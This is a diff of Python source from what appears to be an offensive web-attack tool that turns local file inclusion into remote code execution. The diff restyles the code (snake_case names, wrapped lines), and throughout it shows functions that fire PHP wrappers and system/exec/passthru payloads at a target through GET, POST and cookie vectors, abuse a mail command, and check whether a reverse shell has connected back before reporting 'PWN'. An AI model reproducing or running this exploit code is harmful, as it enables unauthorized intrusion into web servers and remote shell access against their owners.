-                    subprocess.call(["mail", "-s", topics[i], "www-data@{}".format(host)], stdin=p.stdout)
+                    p = subprocess.Popen(
+                        ["echo", "Uno reverse shell"],
+                        stdout=subprocess.PIPE,
+                    )
+                    subprocess.call(
+                        ["mail", "-s", topics[i], "www-data@{}".format(host)],
+                        stdin=p.stdout,
+                    )
                 except Exception as e:
-                    showStatus(gui, exception=e)
+                    show_status(gui, exception=e)
                     if app:
                         app.processEvents()
                 try:
                     s.send(prep, timeout=timeout)
-                    showStatus(gui)
+                    show_status(gui)
                     if app:
                         app.processEvents()
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    showStatus(gui, timeout=True)
+                except (
+                    requests.exceptions.Timeout,
+                    requests.exceptions.ConnectionError
+                ):
+                    show_status(gui, timeout=True)
                     if app:
                         app.processEvents()
         elif technique == 6:
@@ -813,9 +1007,13 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
 
             for i in range(0, len(wrappersPart1)):
                 wrapper = wrappersPart1[i]
-                sys.stdout.write("{0}  : {2}{1}".format(color.RD, color.END, namesPart1[i]))
+                sys.stdout.write("{0}  : {2}{1}".format(
+                    color.RD, color.END, namesPart1[i]
+                ))
                 if gui:
-                    gui.crawlerResultDisplay.append("  : {}".format(namesPart1[i]))
+                    gui.crawlerResultDisplay.append(
+                        "  : {}".format(namesPart1[i])
+                    )
                     gui.show()
                     app.processEvents()
                 if attack == 1:
@@ -824,21 +1022,24 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     prep = inpath("", "", wrapper, "", url, url2, s)[0]
                 elif attack == 3:
                     s.cookies.set(selected, wrapper)
-                    req = requests.Request(method='GET', url=url)
+                    req = requests.Request(method="GET", url=url)
                     prep = s.prepare_request(req)
                 elif attack == 4:
-                    req = requests.Request(method='POST', url=url, data=wrapper)
+                    req = requests.Request(method="POST", url=url, data=wrapper)
                     prep = s.prepare_request(req)
-                    newBody = unquote(prep.body)
-                    prep.body = newBody
-                    prep.headers["content-length"] = len(newBody)
+                    new_body = unquote(prep.body)
+                    prep.body = new_body
+                    prep.headers["content-length"] = len(new_body)
                 try:
                     s.send(prep, timeout=timeout)
-                    showStatus(gui)
+                    show_status(gui)
                     if app:
                         app.processEvents()
-                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                    showStatus(gui, timeout=True)
+                except (
+                    requests.exceptions.Timeout,
+                    requests.exceptions.ConnectionError
+                ):
+                    show_status(gui, timeout=True)
                     if app:
                         app.processEvents()
 
@@ -848,11 +1049,19 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 '<?php exec("{}"); ?>'.format(PAYLOAD),
                 '<?php passthru("{}"); ?>'.format(PAYLOAD)
             ]
-            names = ["php input.system():   ", "php input.exec():     ", "php input.passthru(): "]
+            names = [
+                "php input.system():   ",
+                "php input.exec():     ",
+                "php input.passthru(): "
+            ]
             for i in range(0, len(payloads)):
-                sys.stdout.write("{0}  : {2}{1}".format(color.RD, color.END, names[i]))
+                sys.stdout.write("{0}  : {2}{1}".format(
+                    color.RD, color.END, names[i]
+                ))
                 if gui:
-                    gui.crawlerResultDisplay.append("  : Trying {}".format(names[i]))
+                    gui.crawlerResultDisplay.append(
+                        "  : Trying {}".format(names[i])
+                    )
                     gui.show()
                     app.processEvents()
                 if attack == 1:
@@ -860,11 +1069,19 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                         cont = "?" + keyword + "=" + wrapper + url2
                     else:
                         cont = "&" + keyword + "=" + wrapper + url2
-                    req = requests.Request(method='POST', url=url + cont, data=payloads[i])
+                    req = requests.Request(
+                        method="POST",
+                        url=url + cont,
+                        data=payloads[i]
+                    )
                     prep = s.prepare_request(req)
                 elif attack == 3:
                     s.cookies.set(selected, wrapper)
-                    req = requests.Request(method='POST', url=url + cont, data=payloads[i])
+                    req = requests.Request(
+                        method="POST",
+                        url=url + cont,
+                        data=payloads[i]
+                    )
                     prep = s.prepare_request(req)
                 else:
                     prep = None
@@ -872,27 +1089,38 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 if prep:
                     try:
                         s.send(prep, timeout=timeout)
-                        showStatus(gui)
+                        show_status(gui)
                         if app:
                             app.processEvents()
-                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
-                        showStatus(gui, timeout=True)
+                    except (
+                        requests.exceptions.Timeout,
+                        requests.exceptions.ConnectionError
+                    ):
+                        show_status(gui, timeout=True)
                         if app:
                             app.processEvents()
                 else:
-                    showStatus(gui, exception="Attack vector not supported.")
+                    show_status(
+                        gui,
+                        exception="Attack vector not supported."
+                    )
                     if app:
                         app.processEvents()
     else:
-        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
+        sys.stdout.write("{0} FAIL{2}|{1}\n".format(
+            color.O, color.END, color.END + color.RD
+        ))
         if gui:
             gui.crawlerResultDisplay.append(" FAIL\n")
             gui.show()
             app.processEvents()
 
 
-def lfishell(techniques, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-             wlist, authcookie, postdata, depth, gui=None, app=None):
+def lfi_rce(
+        techniques, attack, url, url2, keyword, cookie,
+        selected, verbose, paylist, nullist,
+        wlist, authcookie, post_data, depth, gui=None, app=None
+    ):
     """
     invoke sheller() for each technique
     @params:
@@ -906,42 +1134,61 @@ def lfishell(techniques, attack, url, url2, keyword, cookie, selected, verbose, 
         gui.show()
         app.processEvents()
     for technique in techniques:
-        sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist,
-                wlist, authcookie, postdata, depth, gui, app)
+        sheller(
+            technique, attack, url, url2, keyword, cookie,
+            selected, verbose, paylist, nullist,
+            wlist, authcookie, post_data, depth, gui, app
+        )
 
 
-def showStatus(gui, timeout=False, exception=None):
+def show_status(gui, timeout=False, exception=None):
     """
     print status of RCE probe
     """
     if exception:
-        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
-        print("{0}Exception:{1}\n{2}".format(color.O, color.END, exception))
+        sys.stdout.write("{0} FAIL{2}|{1}\n".format(
+            color.O, color.END, color.END + color.RD
+        ))
+        print("{0}Exception:{1}\n{2}".format(
+            color.O, color.END, exception
+        ))
         if gui:
-            gui.crawlerResultDisplay.append(" FAIL\nException:\n{}\n".format(exception))
+            gui.crawlerResultDisplay.append(
+                " FAIL\nException:\n{}\n".format(exception)
+            )
             gui.show()
         return
     if timeout:
-        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
+        sys.stdout.write("{0} FAIL{2}|{1}\n".format(
+            color.O, color.END, color.END + color.RD
+        ))
         print("{0}Timeout{1}".format(color.O, color.END))
         if gui:
             gui.crawlerResultDisplay.append(" FAIL\nTimeout\n")
             gui.show()
         return
-    if checkConn():
-        sys.stdout.write("{0} PWN {2}|{1}\n".format(color.O, color.END, color.END + color.RD))
-        notify("Reverse Shell arrived on Port {}.".format(vars.LISTENPORT))
+    if check_conn():
+        sys.stdout.write("{0} PWN {2}|{1}\n".format(
+            color.O, color.END, color.END + color.RD
+        ))
+        notify(
+            "Reverse Shell arrived on Port {}.".format(
+                vars.LISTENPORT
+            )
+        )
         if gui:
             gui.crawlerResultDisplay.append(" PWN\n")
             gui.show()
     else:
-        sys.stdout.write("{0} FAIL{2}|{1}\n".format(color.O, color.END, color.END + color.RD))
+        sys.stdout.write("{0} FAIL{2}|{1}\n".format(
+            color.O, color.END, color.END + color.RD
+        ))
         if gui:
             gui.crawlerResultDisplay.append(" FAIL\n")
             gui.show()
 
 
-def checkConn():
+def check_conn():
     """
     check if our reverse shell has arrived
     """
